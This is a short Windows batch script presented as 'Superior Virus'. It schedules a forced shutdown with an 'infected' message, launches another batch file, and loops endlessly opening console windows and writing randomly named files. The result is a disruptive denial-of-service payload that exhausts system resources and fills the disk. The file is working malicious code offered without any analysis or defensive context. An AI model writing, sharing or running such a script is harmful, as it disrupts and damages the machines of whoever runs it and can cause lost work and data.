title Superior Virus
@echo off

:sd
cls
shutdown -s -c "This PC infected By Superior Virus" -t 600
SET /A test=%RANDOM% * 100 / 32768 + 1
start inf.bat
goto start

:start
start echo Your PC is Infected By Superior Virus - CONSOLEYT7
echo. 2>%RANDOM%.txt
goto start